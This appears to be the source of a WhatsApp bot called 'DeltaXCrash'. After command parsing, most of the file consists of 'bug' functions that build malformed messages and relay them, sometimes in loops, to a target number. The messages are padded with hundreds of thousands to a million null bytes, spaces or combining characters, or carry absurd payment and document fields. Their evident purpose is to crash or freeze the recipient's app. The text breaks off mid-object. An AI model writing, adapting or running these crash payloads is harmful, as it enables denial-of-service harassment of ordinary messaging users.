module.exports = async (deltaxcrash, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const premium = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const owner2 = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const isPremium = premium.includes(m.sender)
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const budy = (typeof m.text == 'string' ? m.text : '')
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : isOwner && !m.isBaileys ? '' : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const from = m.key.remoteJid
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
//const readmore = more.repeat(4001) 
const botNumber = await deltaxcrash.decodeJid(deltaxcrash.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = m.isGroup ? await deltaxcrash.groupMetadata(m.chat).catch(e => {}) : {}
let participant_bot = m.isGroup ? groupMetadata?.participants.find((v) => v.id == botNumber) : {}
let participant_sender = m.isGroup ? groupMetadata?.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, getRandom, getTime, tanggal, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const { ios } = require("./virtex/ios.js")
const nulll = fs.readFileSync(`./DeltaNew/nulll.jpg`)
const nulll2 = fs.readFileSync(`./DeltaNew/nulll2.jpg`)
const kontol = fs.readFileSync(`./DeltaNew/kontol.jpg`)
const latx = fs.readFileSync(`./DeltaNew/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
//=========== MESSAGE ===========//
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`Massage`, `yellow`), color(`from`, `white`), color(`${senderNumber}`, `yellow`), color(`Text :`, `white`), color(`${cmd}`, `yellow`))
}

//========= FAKE QUOTED =========//
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `deltaxcrash`
}}}


const qcall = {
key: {
participant: "0@s.whatsapp.net",
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    ////"name": `${namabot} Project`,
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}


const deltaxcrashcrash = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./DeltaNew/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᷍ĐɆŁŦȺXȻɌȺSĦ👾╮⭑ ☠️⃰͜͡⚡ĐɆŁŦȺXȻɌȺSĦ᜴⚡ #ĐɆŁŦȺXȻɌȺSĦཀ͜͡👾⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const deltaxcrashcrash2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./DeltaNew/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️࿆᷍👾ĐɆŁŦȺXȻɌȺSĦ👾╮⭑ ☠️⃰͜ĐɆŁŦȺXȻɌȺSĦ᜴͡ #⃟ĐɆŁŦȺXȻɌȺSĦ⚡╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦",
    "description": "xe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const deltaxcrashphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const deltaxcrashvoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const deltanotfoundvault = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦`
}
}
}

const deltanotfoundbut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: '𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const deltanotfoundbug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `1203622477390375@newsletter`,
newsletterName: `👾`,
jpegThumbnail: fakejpg,
caption: ` 𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦\n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}




const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
"h": `Hm👾m`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
"caption": `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "DeltaNew/jpeg",
"jpegThumbnail": "",
},
"title": `${namaowner2} - Marketplace`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "999999999999999",
"retailerId": `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}



const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}



const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "ĐɆŁŦȺXȻɌȺSĦ"+" ".repeat(920000),
        'footerText': `✳️࿆᷍👾͆ĐɆŁŦȺXȻɌȺSĦ᜴̿╮⭑ ☠️⃰͜͡؜🥶🤡⃟👾ĐɆŁŦȺXȻɌȺSĦ᜴ཀ͜͡✨⃟╮.xd`,
        'description': `✳️࿆᷍👾͆ĐɆŁŦȺXȻɌȺSĦ᜴̿╮⭑ ☠️⃰͜͡؜🤡🥶⃟👾ĐɆŁŦȺXȻɌȺSĦཀ͜͡✨⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "439252450816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '439252450816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "DeltaNew/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍ĐɆŁŦȺXȻɌȺSĦ᜴͆╮⭑ ☠️⃰͜͡⚡⃟👾᜴ĐɆŁŦȺXȻɌȺSĦཀ͜͡👾⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/14421142a4e58f13a29f2.jpg" } }, { upload: deltaxcrash.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦╮⭑ ☠️⃰͜͡؜𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦👾᜴▴𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    deltaxcrash.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return deltaxcrash.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return deltaxcrash.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}


async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦 ⿻ 𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦╮⭑ ☠️⃰͜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒͡؜᜴▴𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒᜴▴𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: deltanotfoundvault });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function deltaxcrashiphone(target) {
await deltaxcrash.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function deltaxcrashdevil(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒᜴▴𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮.👾`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "✨⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/14421142a4e58f13a29f2.jpg" } }, { upload: deltaxcrash.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "DeltaNew/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./DeltaNew/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
